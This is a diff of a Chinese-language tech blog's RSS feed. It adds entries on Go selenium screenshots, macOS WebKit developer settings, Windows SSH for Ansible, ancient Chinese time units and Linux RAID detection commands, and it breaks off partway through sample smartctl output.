@@ -1349,6 +1349,8 @@ Unit: bytes per second&lt;/li>
 &lt;p>此建議不適用於大型結構，甚至不適用於可能增加大小的小型結構。特別是，協定緩衝區訊息通常應透過指標而不是值來處理。指標類型滿足 &lt;code>proto.Message&lt;/code> 介面（被 &lt;code>proto.Marshal&lt;/code> 、 &lt;code>protocmp.Transform&lt;/code> 等接受），且協定緩衝區訊息可能非常大，並且通常會隨著時間的推移而變得更大。&lt;/p></description></item><item><title>LLM Visualization</title><link>https://linzeyan.github.io/zh-tw/posts/20240121-llm/</link><pubDate>Sun, 21 Jan 2024 12:40:00 +0800</pubDate><guid>https://linzeyan.github.io/zh-tw/posts/20240121-llm/</guid><description>&lt;ul>
 &lt;li>&lt;a href="https://bbycroft.net/llm" target="_blank" rel="noopener">LLM Visualization&lt;/a>&lt;/li>
 &lt;li>&lt;a href="https://github.com/bbycroft/llm-viz" target="_blank" rel="noopener">Github&lt;/a>&lt;/li>
+&lt;/ul></description></item><item><title>Terraform Provider 開發紀錄</title><link>https://linzeyan.github.io/zh-tw/posts/20221228-terraform-provider-development/</link><pubDate>Thu, 28 Dec 2023 12:36:00 +0800</pubDate><guid>https://linzeyan.github.io/zh-tw/posts/20221228-terraform-provider-development/</guid><description>&lt;ul>
+&lt;li>&lt;a href="https://hazel.style/2022/12/06/Terraform-Provider-Development/" target="_blank" rel="noopener">Terraform Provider 開發紀錄&lt;/a>&lt;/li>
 &lt;/ul></description></item><item><title>A python script that allows your terminal to snow.</title><link>https://linzeyan.github.io/zh-tw/posts/20231224-snow/</link><pubDate>Sun, 24 Dec 2023 15:40:00 +0800</pubDate><guid>https://linzeyan.github.io/zh-tw/posts/20231224-snow/</guid><description>&lt;ul>
 &lt;li>&lt;a href="https://github.com/sontek/snowmachine" target="_blank" rel="noopener">A python script that allows your terminal to snow.&lt;/a>&lt;/li>
 &lt;/ul>
@@ -1421,7 +1423,7 @@ Unit: bytes per second&lt;/li>
 &lt;li>&lt;a href="https://www.youtube.com/watch?v=M3z6gI1AEns" target="_blank" rel="noopener">https://www.youtube.com/watch?v=M3z6gI1AEns&lt;/a>&lt;/li>
 &lt;/ul>
 &lt;!--
-&lt;video class="video-player" id="video-146" playsinline controls>
+&lt;video class="video-player" id="video-174" playsinline controls>
 &lt;source src="https://www.youtube.com/watch?v=M3z6gI1AEns" type="video/mp4" />
 &lt;/video>
 --></description></item><item><title>Golang tips</title><link>https://linzeyan.github.io/zh-tw/posts/20230926-golang/</link><pubDate>Tue, 26 Sep 2023 22:15:00 +0800</pubDate><guid>https://linzeyan.github.io/zh-tw/posts/20230926-golang/</guid><description>&lt;ul>
@@ -1793,9 +1795,7 @@ TARGETVARIANT
 &lt;h4 id="bat">&lt;a href="https://github.com/sharkdp/bat" target="_blank" rel="noopener">bat&lt;/a>&lt;/h4>
 &lt;p>bat is one of my favorite tools from this list. It&amp;rsquo;s a replacement for cat.&lt;/p>
 &lt;h4 id="dust">&lt;a href="https://github.com/bootandy/dust" target="_blank" rel="noopener">dust&lt;/a>&lt;/h4>
-&lt;p>Dust is an alternative for the du command. It is fast and has a better UX with nice visualization for disk usage.&lt;/p></description></item><item><title>Terraform Provider 開發紀錄</title><link>https://linzeyan.github.io/zh-tw/posts/20221228-terraform-provider-development/</link><pubDate>Tue, 03 Jan 2023 12:36:00 +0800</pubDate><guid>https://linzeyan.github.io/zh-tw/posts/20221228-terraform-provider-development/</guid><description>&lt;ul>
-&lt;li>&lt;a href="https://hazel.style/2022/12/06/Terraform-Provider-Development/" target="_blank" rel="noopener">Terraform Provider 開發紀錄&lt;/a>&lt;/li>
-&lt;/ul></description></item><item><title>Windows SSH setup</title><link>https://linzeyan.github.io/zh-tw/posts/20230103-windows-ssh-setup/</link><pubDate>Tue, 03 Jan 2023 12:36:00 +0800</pubDate><guid>https://linzeyan.github.io/zh-tw/posts/20230103-windows-ssh-setup/</guid><description>&lt;ul>
+&lt;p>Dust is an alternative for the du command. It is fast and has a better UX with nice visualization for disk usage.&lt;/p></description></item><item><title>Windows SSH setup</title><link>https://linzeyan.github.io/zh-tw/posts/20230103-windows-ssh-setup/</link><pubDate>Tue, 03 Jan 2023 12:36:00 +0800</pubDate><guid>https://linzeyan.github.io/zh-tw/posts/20230103-windows-ssh-setup/</guid><description>&lt;ul>
 &lt;li>&lt;a href="https://ansible.cloudns.pro/post/windows-ssh-setup/" target="_blank" rel="noopener">Windows SSH setup&lt;/a>&lt;/li>
 &lt;li>&lt;a href="https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_install_firstuse" target="_blank" rel="noopener">Install OpenSSH for Windows&lt;/a>&lt;/li>
 &lt;/ul>
@@ -1804,7 +1804,296 @@ TARGETVARIANT
 &lt;li>inventory 主機裡要加入 ansible_connection 主機變數，告知要使用 ssh 連線。(&lt;code>192.168.192.11 ansible_user=Administrator ansible_connection=ssh ansible_shell_type=cmd &lt;/code>)&lt;/li>
 &lt;li>可能會需要在 ansible.cfg 裡加上 remote_tmp 設定，指定為 C:\TEMP&lt;/li>
 &lt;li>Playbook 裡可以使用 win_ 開頭的模組，或是使用 raw 模組&lt;/li>
-&lt;/ol></description></item><item><title>Gin 框架绑定 JSON 参数使用 jsoniter</title><link>https://linzeyan.github.io/zh-tw/posts/20211122-go-gin-jsoniter/</link><pubDate>Mon, 22 Nov 2021 10:27:39 +0800</pubDate><guid>https://linzeyan.github.io/zh-tw/posts/20211122-go-gin-jsoniter/</guid><description>&lt;ul>
+&lt;/ol></description></item><item><title>Inspecting Web Views in macOS</title><link>https://linzeyan.github.io/zh-tw/posts/20221202-inspecting-web-views-in-macos/</link><pubDate>Fri, 02 Dec 2022 13:51:24 +0800</pubDate><guid>https://linzeyan.github.io/zh-tw/posts/20221202-inspecting-web-views-in-macos/</guid><description>&lt;ul>
+&lt;li>&lt;a href="https://blog.jim-nielsen.com/2022/inspecting-web-views-in-macos/" target="_blank" rel="noopener">Inspecting Web Views in macOS&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>defaults write NSGlobalDomain WebKitDeveloperExtras -bool true
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>defaults write -g WebKitDeveloperExtras -bool YES
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Go 使用 selenium 截图</title><link>https://linzeyan.github.io/zh-tw/posts/20221202-go-selenium/</link><pubDate>Fri, 02 Dec 2022 13:40:19 +0800</pubDate><guid>https://linzeyan.github.io/zh-tw/posts/20221202-go-selenium/</guid><description>&lt;ul>
+&lt;li>&lt;a href="https://dmesg.app/go-selenium.html" target="_blank" rel="noopener">Go 使用 selenium 截图&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-go" data-lang="go">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> (
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;fmt&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">log&lt;/span> &lt;span style="color:#e6db74">&amp;#34;github.com/sirupsen/logrus&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;github.com/tebeka/selenium&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;io/ioutil&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> (
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">chromeDriverPath&lt;/span> = &lt;span style="color:#e6db74">&amp;#34;/usr/local/bin/chromedriver&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">port&lt;/span> = &lt;span style="color:#ae81ff">9515&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">func&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>() {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">opts&lt;/span> []&lt;span style="color:#a6e22e">selenium&lt;/span>.&lt;span style="color:#a6e22e">ServiceOption&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">selenium&lt;/span>.&lt;span style="color:#a6e22e">SetDebug&lt;/span>(&lt;span style="color:#66d9ef">false&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">service&lt;/span>, &lt;span style="color:#a6e22e">err&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#a6e22e">selenium&lt;/span>.&lt;span style="color:#a6e22e">NewChromeDriverService&lt;/span>(&lt;span style="color:#a6e22e">chromeDriverPath&lt;/span>, &lt;span style="color:#a6e22e">port&lt;/span>, &lt;span style="color:#a6e22e">opts&lt;/span>&lt;span style="color:#f92672">...&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#a6e22e">err&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">nil&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> panic(&lt;span style="color:#a6e22e">err&lt;/span>) &lt;span style="color:#75715e">// panic is used only as an example and is not otherwise recommended.&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">defer&lt;/span> &lt;span style="color:#a6e22e">service&lt;/span>.&lt;span style="color:#a6e22e">Stop&lt;/span>()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">caps&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#a6e22e">selenium&lt;/span>.&lt;span style="color:#a6e22e">Capabilities&lt;/span>{&lt;span style="color:#e6db74">&amp;#34;browserName&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;chrome&amp;#34;&lt;/span>}
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 整页截屏&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 获取到网页的宽高，然后把浏览器的窗口设置成这么大，然后再截图就好了！需要注意的是只有 headless 模式可以任意设置窗口大小，否则最大高度不能超过你的显示器分辨率&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// chromeCaps := chrome.Capabilities{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Path: &amp;#34;&amp;#34;,&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Args: []string{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// &amp;#34;--headless&amp;#34;,&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// },&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// }&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// caps.AddChrome(chromeCaps)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">wd&lt;/span>, &lt;span style="color:#a6e22e">err&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#a6e22e">selenium&lt;/span>.&lt;span style="color:#a6e22e">NewRemote&lt;/span>(&lt;span style="color:#a6e22e">caps&lt;/span>, &lt;span style="color:#a6e22e">fmt&lt;/span>.&lt;span style="color:#a6e22e">Sprintf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;http://localhost:%d/wd/hub&amp;#34;&lt;/span>, &lt;span style="color:#a6e22e">port&lt;/span>))
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#a6e22e">err&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">nil&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> panic(&lt;span style="color:#a6e22e">err&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">defer&lt;/span> &lt;span style="color:#a6e22e">wd&lt;/span>.&lt;span style="color:#a6e22e">Quit&lt;/span>()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 在 selenium 中使用ExecuteScript就可以执行 JavaScript 代码，需要注意返回值是 interface，所以要类型断言成 float，然后再转成 int&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// height, _ := wd.ExecuteScript(&amp;#34;return document.body.parentNode.scrollHeight&amp;#34;, nil)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// var realHeight = int(height.(float64))&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 然后我们需要设置窗口大小&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// wd.ResizeWindow(&amp;#34;&amp;#34;, 1920, realHeight)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#a6e22e">err&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#a6e22e">wd&lt;/span>.&lt;span style="color:#a6e22e">Get&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;https://github.com/tgbot-collection/archiver&amp;#34;&lt;/span>); &lt;span style="color:#a6e22e">err&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">nil&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> panic(&lt;span style="color:#a6e22e">err&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">screenshot&lt;/span>, &lt;span style="color:#a6e22e">err&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#a6e22e">wd&lt;/span>.&lt;span style="color:#a6e22e">Screenshot&lt;/span>()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#a6e22e">err&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">nil&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">log&lt;/span>.&lt;span style="color:#a6e22e">Errorln&lt;/span>(&lt;span style="color:#a6e22e">err&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">ioutil&lt;/span>.&lt;span style="color:#a6e22e">WriteFile&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;screenshot.png&amp;#34;&lt;/span>, &lt;span style="color:#a6e22e">screenshot&lt;/span>, &lt;span style="color:#ae81ff">0644&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h5 id="整页截屏">整页截屏&lt;/h5>
+&lt;p>获取到网页的宽高，然后把浏览器的窗口设置成这么大，然后再截图就好了！需要注意的是只有 headless 模式可以任意设置窗口大小，否则最大高度不能超过你的显示器分辨率&lt;/p></description></item><item><title>古代計時單位</title><link>https://linzeyan.github.io/zh-tw/posts/20221129-ancient-time-unit/</link><pubDate>Tue, 29 Nov 2022 11:21:02 +0800</pubDate><guid>https://linzeyan.github.io/zh-tw/posts/20221129-ancient-time-unit/</guid><description>&lt;ul>
+&lt;li>&lt;a href="https://wywu.pixnet.net/blog/posts/1022354528" target="_blank" rel="noopener">古代計時單位&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h5 id="十二時辰時間對照表">十二時辰時間對照表&lt;/h5>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>時辰&lt;/th>
+&lt;th>古名&lt;/th>
+&lt;th>對應現代時間&lt;/th>
+&lt;th>初 / 正時間&lt;/th>
+&lt;th>別名（完整）&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>子時&lt;/td>
+&lt;td>夜半&lt;/td>
+&lt;td>23:00-01:00&lt;/td>
+&lt;td>子初 23:00&lt;br>子正 00:00&lt;/td>
+&lt;td>子夜、中夜、午夜、夜分、夜半、未旦、宵分、未央&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>丑時&lt;/td>
+&lt;td>雞鳴&lt;/td>
+&lt;td>01:00-03:00&lt;/td>
+&lt;td>丑初 01:00&lt;br>丑正 02:00&lt;/td>
+&lt;td>荒雞&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>寅時&lt;/td>
+&lt;td>平旦&lt;/td>
+&lt;td>03:00-05:00&lt;/td>
+&lt;td>寅初 03:00&lt;br>寅正 04:00&lt;/td>
+&lt;td>平明、旦明、黎明、早旦、日旦、昧旦、騎旦、早晨、早夜、早朝、昧爽、旦日、旦時&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>卯時&lt;/td>
+&lt;td>日出&lt;/td>
+&lt;td>05:00-07:00&lt;/td>
+&lt;td>卯初 05:00&lt;br>卯正 06:00&lt;/td>
+&lt;td>日上、日生、日升、日始、日晞、旭日、破曉&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>辰時&lt;/td>
+&lt;td>食時&lt;/td>
+&lt;td>07:00-09:00&lt;/td>
+&lt;td>辰初 07:00&lt;br>辰正 08:00&lt;/td>
+&lt;td>早食、宴食、蚤食&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>巳時&lt;/td>
+&lt;td>隅中&lt;/td>
+&lt;td>09:00-11:00&lt;/td>
+&lt;td>巳初 09:00&lt;br>巳正 10:00&lt;/td>
+&lt;td>日隅、禺中、日禺&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>午時&lt;/td>
+&lt;td>日中&lt;/td>
+&lt;td>11:00-13:00&lt;/td>
+&lt;td>午初 11:00&lt;br>午正 12:00&lt;/td>
+&lt;td>日正、日午、日高、正午、中午、亭午、日當午、平午、平晝&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>未時&lt;/td>
+&lt;td>日昳&lt;/td>
+&lt;td>13:00-15:00&lt;/td>
+&lt;td>未初 13:00&lt;br>未正 14:00&lt;/td>
+&lt;td>日昃、日仄、日側、日跌、日斜、日映、日央&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>申時&lt;/td>
+&lt;td>晡時&lt;/td>
+&lt;td>15:00-17:00&lt;/td>
+&lt;td>申初 15:00&lt;br>申正 16:00&lt;/td>
+&lt;td>餔時、日餔、日晡、日鋪、日稷、日夕、夕食&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>酉時&lt;/td>
+&lt;td>日入&lt;/td>
+&lt;td>17:00-19:00&lt;/td>
+&lt;td>酉初 17:00&lt;br>酉正 18:00&lt;/td>
+&lt;td>日沒、日沉、日西、日落、日逝、日晏、日旴、日晦、傍晚&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>戌時&lt;/td>
+&lt;td>黃昏&lt;/td>
+&lt;td>19:00-21:00&lt;/td>
+&lt;td>戌初 19:00&lt;br>戌正 20:00&lt;/td>
+&lt;td>日夕、日末、日暮、日晚、日闇、日墮、日暗、日曛、曛黃&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>亥時&lt;/td>
+&lt;td>人定&lt;/td>
+&lt;td>21:00-23:00&lt;/td>
+&lt;td>亥初 21:00&lt;br>亥正 22:00&lt;/td>
+&lt;td>定昏、夤夜&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;h5 id="更">更&lt;/h5>
+&lt;p>漢代皇宮中值班人員分五個班次，按時更換，叫「五更」，由此古人把便把一夜分為五更，每更為一個時辰。
+戌時為一更，亥時為二更，子時為三更，丑時為四更，寅時為五更&lt;/p></description></item><item><title>How to Detect RAID Information in Linux</title><link>https://linzeyan.github.io/zh-tw/posts/20221128-raid-information-command-line/</link><pubDate>Mon, 28 Nov 2022 15:36:27 +0800</pubDate><guid>https://linzeyan.github.io/zh-tw/posts/20221128-raid-information-command-line/</guid><description>&lt;ul>
+&lt;li>&lt;a href="https://www.baeldung.com/linux/raid-information-command-line" target="_blank" rel="noopener">How to Detect RAID Information in Linux&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h5 id="lspci">lspci&lt;/h5>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>lspci | grep RAID
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>00:1f.2 RAID bus controller: Intel Corporation &lt;span style="color:#ae81ff">82801&lt;/span> Mobile SATA Controller &lt;span style="color:#f92672">[&lt;/span>RAID mode&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">(&lt;/span>rev 04&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h5 id="lshw">lshw&lt;/h5>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>lshw -class storage
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> *-raid
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> description: RAID bus controller
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> product: &lt;span style="color:#ae81ff">82801&lt;/span> Mobile SATA Controller &lt;span style="color:#f92672">[&lt;/span>RAID mode&lt;span style="color:#f92672">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> vendor: Intel Corporation
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> physical id: 1f.2
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> bus info: pci@0000:00:1f.2
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> logical name: scsi0
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> version: &lt;span style="color:#ae81ff">04&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> width: &lt;span style="color:#ae81ff">32&lt;/span> bits
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> clock: 66MHz
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> capabilities: raid msi pm bus_master cap_list emulated
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> configuration: driver&lt;span style="color:#f92672">=&lt;/span>ahci latency&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> resources: irq:26 ioport:f0d0&lt;span style="color:#f92672">(&lt;/span>size&lt;span style="color:#f92672">=&lt;/span>8&lt;span style="color:#f92672">)&lt;/span> ioport:f0c0&lt;span style="color:#f92672">(&lt;/span>size&lt;span style="color:#f92672">=&lt;/span>4&lt;span style="color:#f92672">)&lt;/span> ioport:f0b0&lt;span style="color:#f92672">(&lt;/span>size&lt;span style="color:#f92672">=&lt;/span>8&lt;span style="color:#f92672">)&lt;/span> ioport:f0a0&lt;span style="color:#f92672">(&lt;/span>size&lt;span style="color:#f92672">=&lt;/span>4&lt;span style="color:#f92672">)&lt;/span> ioport:f060&lt;span style="color:#f92672">(&lt;/span>size&lt;span style="color:#f92672">=&lt;/span>32&lt;span style="color:#f92672">)&lt;/span> memory:f7e36000-f7e367ff
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h5 id="smartctl">smartctl&lt;/h5>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dmesg | grep -i scsi
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span> 0.210852&lt;span style="color:#f92672">]&lt;/span> SCSI subsystem initialized
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span> 0.341280&lt;span style="color:#f92672">]&lt;/span> Block layer SCSI generic &lt;span style="color:#f92672">(&lt;/span>bsg&lt;span style="color:#f92672">)&lt;/span> driver version 0.4 loaded &lt;span style="color:#f92672">(&lt;/span>major 243&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span> 1.213299&lt;span style="color:#f92672">]&lt;/span> scsi 0:0:0:0: Direct-Access ATA ST320LT012-9WS14 YAM1 PQ: &lt;span style="color:#ae81ff">0&lt;/span> ANSI: &lt;span style="color:#ae81ff">5&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span> 1.319886&lt;span style="color:#f92672">]&lt;/span> sd 0:0:0:0: &lt;span style="color:#f92672">[&lt;/span>sda&lt;span style="color:#f92672">]&lt;/span> Attached SCSI disk
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span> 19.571008&lt;span style="color:#f92672">]&lt;/span> sd 0:0:0:0: Attached scsi generic sg0 type &lt;span style="color:#ae81ff">0&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>smartctl --all /dev/sda
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Model Family: Seagate Laptop HDD
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Device Model: ST320LT012-9WS14C
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Serial Number: S0V3R9LL
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LU WWN Device Id: &lt;span style="color:#ae81ff">5&lt;/span> 000c50 05be4653c
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Firmware Version: 0001YAM1
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User Capacity: 320,072,933,376 bytes &lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">320&lt;/span> GB&lt;span style="color:#f92672">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Sector Sizes: &lt;span style="color:#ae81ff">512&lt;/span> bytes logical, &lt;span style="color:#ae81ff">4096&lt;/span> bytes physical
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Rotation Rate: &lt;span style="color:#ae81ff">5400&lt;/span> rpm
